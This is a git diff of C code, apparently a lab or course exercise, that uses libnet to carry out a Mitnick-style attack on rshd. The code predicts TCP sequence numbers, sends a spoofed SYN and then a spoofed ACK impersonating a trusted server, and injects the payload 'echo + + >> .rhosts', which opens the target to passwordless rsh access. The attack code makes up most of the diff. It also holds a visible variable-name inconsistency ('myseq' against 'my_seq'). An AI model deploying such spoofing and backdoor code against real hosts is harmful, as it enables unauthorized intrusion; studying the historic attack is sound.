@@ -75,7 +75,7 @@ struct tcp_hdr {
 
 
 //function definitions
-int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip);
+uint32_t send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip);
 int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t xterm_ip, uint16_t my_seq, uint16_t ack);
 tcp_seq compute_next_seq(tcp_seq n1, tcp_seq n2);
 
@@ -210,23 +210,27 @@ int main (void)
 	printf("%u\n", compute_next_seq(seq_array[2], seq_array[1]));
 	printf("%u\n", compute_next_seq(seq_array[3], seq_array[2]));
 	printf("%u\n", compute_next_seq(seq_array[4], seq_array[3]));
-        printf("%u\n", compute_next_seq(seq_array[5], seq_array[4]));
-        printf("%u\n", compute_next_seq(seq_array[6], seq_array[5]));
-        printf("%u\n", compute_next_seq(seq_array[7], seq_array[6]));
-        printf("%u\n", compute_next_seq(seq_array[8], seq_array[7]));
+  printf("%u\n", compute_next_seq(seq_array[5], seq_array[4]));
+  printf("%u\n", compute_next_seq(seq_array[6], seq_array[5]));
+  printf("%u\n", compute_next_seq(seq_array[7], seq_array[6]));
+  printf("%u\n", compute_next_seq(seq_array[8], seq_array[7]));
 
+	tcp_seq predicted_seq = compute_next_seq(seq_array[9], seq_array[8]);
 
 	//exploit trust relation
-	//char username[] = "tsumotsu";
-	//char command[] = "echo + + >> .rhosts";
-
 
 	//send syn impersonating the server
-	//send_syn(514, NULL, 0, l, xterm_ip, sever_ip);
-
-	//send ack with predicted seq
-
-	//inject backdoor
+	//as per manpage rshd, port of the client shound be within a range 512-1024 otherwise the connection is reset
+	tcp_seq myseq = send_syn(514, NULL, 0, l, xterm_ip, sever_ip);
+	printf("sent spoofed syn, waiting a second\n");
+	sleep(1);
+	//send ack with predicted seq and inject backdoor
+	//the command interpretation of the payload is specified in the manpage rshd. Need null-terminated: stderr\0user\0user\0command\0
+	char backdoor[] = "0\0tsutomu\0tsutomu\0echo + + >> .rhosts";
+	uint32_t b_len = 38;
+	//int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t xterm_ip, uint16_t my_seq, uint16_t ack)
+	send_ack(514, 514, (uint8_t *) backdoor, b_len, l, server_ip, xterm_ip, my_seq + 1, predicted_seq + 1);
+	printf("sent ack and pushed backdoor\n");
 
 	//connect from my own ip
 
@@ -236,15 +240,17 @@ int main (void)
 }
 
 
-int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip)
+uint32_t send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip)
 {
 
 	libnet_ptag_t t;
 	//build syn
+	uint32_t my_seq = libnet_get_prand(LIBNET_PRu32);
+
 	t = libnet_build_tcp(
 		libnet_get_prand(LIBNET_PRu16), //sp source port
 		dest_port,											//dp destinatin port
-		libnet_get_prand(LIBNET_PRu32), //sequence number
+		my_seq, //sequence number
     0, 															//ack number, can I send whatever?
     TH_SYN,													//control bit SYN
 		2048, 													//window size, random is ok?
@@ -299,7 +305,7 @@ int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t 
 	}
 
 	libnet_clear_packet(l);
-	return 1;
+	return my_seq;
 }
 
 
@@ -313,7 +319,7 @@ int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t p
 		dest_port,											//dp destinatin port
 		my_seq, 												//sequence number
     ack, 														//ack number, can I send whatever?
-    TH_ACK,													//control bit SYN
+    TH_ACK | TH_PUSH,													//control bit SYN
 		2048, 													//window size, random is ok?
 		0,															//checksum, if 0 libnet autofills
 		10,															//urgent pointer
@@ -374,7 +380,6 @@ tcp_seq compute_next_seq(tcp_seq n1, tcp_seq n2)
 {
 	//expression for next sequence number
 	//seq(N) = 2seq(N-1) - seq(N-2) + 3
-	//tcp_seq n = 2*n1 - n2 + 3;
 	tcp_seq n = 2*n1 - n2 + 3;
 	return n;
 }
